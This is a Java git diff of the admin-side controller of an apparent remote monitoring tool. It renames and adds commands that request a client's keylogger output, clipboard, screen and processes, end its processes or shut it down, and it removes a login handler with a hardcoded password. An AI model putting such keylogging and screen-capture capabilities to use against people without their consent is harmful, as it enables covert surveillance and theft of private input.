@@ -3,68 +3,63 @@ package controllers;
 import admin.Admin;
 import controllers.base.ProduceExecutable;
 import models.MessageModel;
-import models.SystemInfoModel;
 
 import java.util.HashMap;
 import java.util.Map;
 
 import static utils.Command.*;
-import static utils.Command.COMMAND_PROCESS;
 import static utils.Environment.DEFAULT_SERVER_HOST;
 
 public class ProduceController {
     private static Map<String, ProduceExecutable<Admin>> controller = new HashMap();
 
     public static void init() {
-        put(COMMAND_LOGIN, ProduceController::login);
-        put(COMMAND_GET_ALL_CLIENTS, ProduceController::getClients);
-        put(COMMAND_BROADCAST, ProduceController::getBroadcast);
-        put(COMMAND_MONITORING, ProduceController::getMonitoring);
-        put(COMMAND_CLIPBOARD, ProduceController::getClipboard);
-        put(COMMAND_KEYLOGGER, ProduceController::getKeylogger);
-        put(COMMAND_CLIENT_SCREEN, ProduceController::getScreen);
-        put(COMMAND_PROCESS, ProduceController::getProcess);
+        put(COMMAND_GET_HOST_PRIVILEGE, ProduceController::getHostPrivilege);
+        put(COMMAND_CLIENT_SYSTEM_USAGE, ProduceController::getMonitoring);
+        put(COMMAND_CLIENT_CLIPBOARD, ProduceController::getClipboard);
+        put(COMMAND_CLIENT_KEYLOGGER, ProduceController::getKeylogger);
+        put(COMMAND_CLIENT_PROCESS, ProduceController::getProcess);
+        put(COMMAND_CLIENT_MONITOR, ProduceController::getScreen);
+        put(COMMAND_GET_CLIENTS, ProduceController::getClients);
     }
 
     private static String getProcess(Admin admin) {
-        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_PROCESS).json();
+        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_CLIENT_PROCESS).json();
     }
 
     private static String getScreen(Admin admin) {
-        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_CLIENT_SCREEN).json();
+        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_CLIENT_MONITOR).json();
     }
 
     private static String getMonitoring(Admin admin) {
-        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_MONITORING).json();
+        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_CLIENT_SYSTEM_USAGE).json();
     }
 
     private static String getClipboard(Admin admin) {
-        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_CLIPBOARD).json();
+        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_CLIENT_CLIPBOARD).json();
     }
 
     private static String getKeylogger(Admin admin) {
-        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_KEYLOGGER).json();
+        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_CLIENT_KEYLOGGER).json();
     }
 
     private static String getClients(Admin admin) {
-        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST)
-                .put(COMMAND, COMMAND_GET_ALL_CLIENTS)
+        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_GET_CLIENTS).json();
+    }
+
+    private static String getHostPrivilege(Admin admin) {
+        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_GET_HOST_PRIVILEGE).json();
+    }
+
+    public static String endProcess(String pid, String countdown) {
+        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_END_CLIENT_PROCESS)
+                .put("countdown", countdown)
+                .put("pid", pid)
                 .json();
     }
 
-    private static String login(Admin admin) {
-        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST)
-                .put("command", "/login")
-                .put("username", "DEFAULT_FROM")
-                .put("password", "123456")
-                .json();
-    }
-
-    private static String getBroadcast(Admin admin) {
-        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST)
-                .put(COMMAND, COMMAND_BROADCAST)
-                .put("message", "hello world!")
-                .json();
+    public static String shutdown(String countdown) {
+        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_SHUTDOWN_CLIENT).put("countdown", countdown).json();
     }
 
     private static String getNotFoundController(Admin obj) throws Exception {
@@ -77,63 +72,5 @@ public class ProduceController {
 
     public static ProduceExecutable put(String key, ProduceExecutable<Admin> value) {
         return controller.put(key, value);
-    }
-
-    public static String endProcess(String pid, String countdown) {
-        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_END_PROCESS)
-                .put("pid", pid)
-                .put("countdown", countdown)
-                .json();
-    }
-
-    public static String shutdown(String countdown) {
-        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_SHUTDOWN).put("countdown", countdown).json();
-    }
-
-    public static void main(String[] args) throws InterruptedException {
-//        String tmp1 = System.getenv("PROCESSOR_IDENTIFIER");
-//        String tmp2 = System.getenv("PROCESSOR_ARCHITECTURE");
-//        String tmp3 = System.getenv("PROCESSOR_ARCHITEW6432");
-//        String tmp4 = System.getenv("NUMBER_OF_PROCESSORS");
-//        com.sun.management.OperatingSystemMXBean osBean = (com.sun.management.OperatingSystemMXBean) ManagementFactory.getPlatformMXBean(OperatingSystemMXBean.class);
-//        while (true) {
-////            System.out.println(osBean.getProcessCpuLoad() * 100);
-//            System.out.println(oeeeesBean.getSystemCpuLoad()  * 100);
-//e
-//            Thread.sleep(1000);
-//        }
-//        System.out.println((osBean.getTotalPhysicalMemorySize()/1073741824)+"");
-//        System.out.println((osBean.getFreePhysicalMemorySize()/1073741824)+"");
-
-//        console.log(String.valueOf(new File("C:/").getFreeSpace() / (1024 * 1024 * 1024)));
-
-//        System.getenv().forEach((e,v)->{
-//            console.log(e+ " | " +v);
-//        });
-//        console.log( );
-//        console.log(tmp2 );
-//        console.log(tmp3 );
-//        console.log(tmp4 );
-//        File[] paths;
-//        FileSystemView fsv = FileSystemView.getFileSystemView();
-//
-//// returns pathnames for files and directory
-//        paths = File.listRoots();
-//
-//// for each pathname in pathname array
-//        for(File path : paths)
-//        {
-//            // prints file and directory paths
-//            System.out.println("Drive Name: "+path);
-//            System.out.println("Description: "+ path.getFreeSpace() / (1024 * 1024 * 1024));
-//            System.out.println("TOTAL: "+ path.getTotalSpace() / (1024 * 1024 * 1024));
-//        }
-//        Properties p = System.getProperties();
-//        p.list(System.out);
-//        System.out.print("Total CPU:");
-//        System.out.println(Runtime.getRuntime().availableProcessors());
-//        System.out.println("Max Memory:" + (Runtime.getRuntime().maxMemory() / 1073741824) + "\n" + "available Memory:" + Runtime.getRuntime().freeMemory());
-//        System.out.println("os.name=" + System.getProperty("os.name"));
-
     }
 }
